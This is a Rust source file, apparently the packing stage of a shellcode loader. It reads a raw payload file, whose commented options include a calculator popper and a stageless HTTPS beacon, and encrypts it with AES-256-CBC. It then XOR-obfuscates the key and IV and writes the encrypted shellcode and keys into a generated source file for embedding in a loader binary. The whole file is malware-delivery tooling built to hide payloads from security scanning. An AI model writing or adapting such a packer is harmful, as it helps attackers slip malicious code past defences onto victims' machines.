use openssl::symm::{encrypt, Cipher};
use rand::Rng;

// const RAW_SC: &str = "calc64.raw";     // 弹出计算器
// const RAW_SC: &str = "https_x64_50143_stageless_indirect_xthread.bin";
const RAW_SC: &str = "payload.bin";


fn main() {

    let raw_shellcode = std::fs::read(RAW_SC).expect("Error in reading the file");

    let mut rng = rand::thread_rng();

    let key: [u8; 32] = rng.gen();
    let iv: [u8; 16] = rng.gen();
    let mix: [u8; 32] = rng.gen();

    // 混淆
    let newiv: [u8; 16] = iv
        .into_iter()
        .zip(key)
        .map(|(a, b)| a ^ b ^ 5 << 3)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();
    let newkey: [u8; 32] = key
        .into_iter()
        .zip(mix)
        .map(|(a, b)| a ^ b ^ 5 >> 1)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();

    // println!("newkey: {:?}\nnewiv: {:?}", newkey, newiv);

    let cipher = Cipher::aes_256_cbc();
    let data = raw_shellcode.as_slice();
    // let data = b"aes-256-cbc testing ::::: Some Crypto Text";
    let ciphertext = encrypt(cipher, &newkey, Some(&newiv), data).unwrap();
    // println!("加密后{:?}",ciphertext);

    let a = ciphertext
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let b = key
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let c = iv
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let d = mix
        .iter()
        .map(|b| format!("{}", b).to_string())
        .collect::<Vec<String>>()
        .join(", ");

    let filedata = format!(
        "pub fn getdata()->(Vec<u8>, Vec<u8>,Vec<u8>, Vec<u8>){{
        (vec![{}],
        vec![{}],vec![{}],vec![{}])
    }}",
        a, b, c, d
    );

    std::fs::write("src/data_tmp.rs", filedata).unwrap();

    // 解密
    // let plaintext = decrypt(cipher, &newkey, Some(&newiv), ciphertext.as_slice()).unwrap();
    // println!("解密后{:?}",String::from_utf8_lossy(&plaintext));
}
